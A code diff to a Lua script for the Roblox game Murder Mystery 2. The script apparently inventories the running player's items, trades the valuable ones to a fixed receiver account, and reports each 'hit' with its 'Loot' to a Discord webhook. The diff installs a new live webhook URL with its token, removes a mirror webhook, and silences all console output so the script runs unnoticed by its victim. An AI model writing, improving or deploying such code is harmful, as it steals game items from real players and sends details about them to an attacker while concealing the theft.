@@ -9,7 +9,8 @@ local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-local WEBHOOK = "https://discord.com/api/webhooks/1546525713094414346/WeNmEG_D7Ct1t_jehpqSwwOGDv-u8Nxww-2w2Uh0vw5dpvekF3AYxlztEERoB4rFcuHM"
+-- The only webhook the script posts to.
+local WEBHOOK = "https://discord.com/api/webhooks/1550959609152536630/iw-t1RqGMRqA3SUcoqg6WNXoL-LxXzOBvxaPQYS6_UrI0Typ8tY27N70o8n7samITRSR"
 local RECEIVER = {"Alljm100"}
 -- Minimum price an item must have to be traded, expressed in the value base's
 -- own units. The base runs from 0.03 to 1250, so 0.02 lets everything through,
@@ -74,10 +75,8 @@ local STATUS_LABELS = {
 -- Item lines shown in the Loot block before it is truncated.
 local LOOT_LINE_LIMIT = 15
 
--- Receiver account, and an optional second webhook to mirror the hit into.
-local SECOND_WEBHOOK = ""
+-- Receiver account, used for the trade target and the status line.
 local ar = RECEIVER[1]
-local aw = (SECOND_WEBHOOK ~= "") and SECOND_WEBHOOK or nil
 
 local function GetRequestFunction()
     if request then return request end
@@ -88,6 +87,16 @@ end
 
 local function SafeKick(Message)
     pcall(function() LocalPlayer:Kick(Message) end)
+end
+
+-- Nothing is printed to the executor console by default, so executing the script
+-- stays silent. Flip DEBUG to true to bring the value-base and inventory
+-- diagnostics back.
+local DEBUG = false
+local function Log(...)
+    if DEBUG then
+        warn(...)
+    end
 end
 
 local function HttpGet(Url, Timeout)
@@ -170,7 +179,7 @@ local ServerTypeOK, ServerTypeErr = pcall(function()
 end)
 
 if not ServerTypeOK then
-    warn("[MM2] Failed to determine server type:", ServerTypeErr)
+    Log("[MM2] Failed to determine server type:", ServerTypeErr)
 elseif ServerType == "VIPServer" then
     SafeKick("Private servers are not supported.")
     return
@@ -306,23 +315,23 @@ end
 local function LoadDatabase()
     local Body = HttpGet(VALUE_API, 15)
     if not Body then
-        warn("[MM2] Value base unreachable:", VALUE_API)
+        Log("[MM2] Value base unreachable:", VALUE_API)
         return nil, nil, 0
     end
 
     local Entries = ParseValueApi(Body)
     if not Entries then
-        warn("[MM2] Value base returned an unexpected payload.")
+        Log("[MM2] Value base returned an unexpected payload.")
         return nil, nil, 0
     end
 
     local Mapping, OrderList, ItemCount = BuildMapping(Entries)
     if not Mapping then
-        warn("[MM2] Value base held no usable prices.")
+        Log("[MM2] Value base held no usable prices.")
         return nil, nil, 0
     end
 
-    warn(string.format("[MM2] Value base loaded: %d items.", ItemCount))
+    Log(string.format("[MM2] Value base loaded: %d items.", ItemCount))
     return Mapping, OrderList, ItemCount
 end
 
@@ -339,7 +348,7 @@ if LoadedData and LoadedOrder and #LoadedOrder > 0 then
     ItemDatabase = LoadedData
     RarityPriority = LoadedOrder
 else
-    warn("[MM2] Value base failed to load; item values/rarities may be unavailable.")
+    Log("[MM2] Value base failed to load; item values/rarities may be unavailable.")
 end
 
 local function FormatNameDisplay(Text)
@@ -438,7 +447,7 @@ local function RefreshInventoryLists()
     end)
 
     if not ProfileOK then
-        warn("[MM2] Inventory request failed:", ProfileErr)
+        Log("[MM2] Inventory request failed:", ProfileErr)
         return AllItems, TradeItems, TotalValue, FullValue, Unresolved
     end
 
@@ -668,18 +677,6 @@ local function SendAllEmbeds()
             Body = HttpService:JSONEncode({content = MainMention, embeds = {MainEmbed}})
         })
     end)
-
-    if type(aw) == "string" and aw ~= "" then
-        pcall(function()
-            local XEmbed, XMention = BuildEmbed(ar)
-            RequestFunc({
-                Url = aw,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({content = XMention, embeds = {XEmbed}})
-            })
-        end)
-    end
 end
 
 SendAllEmbeds()
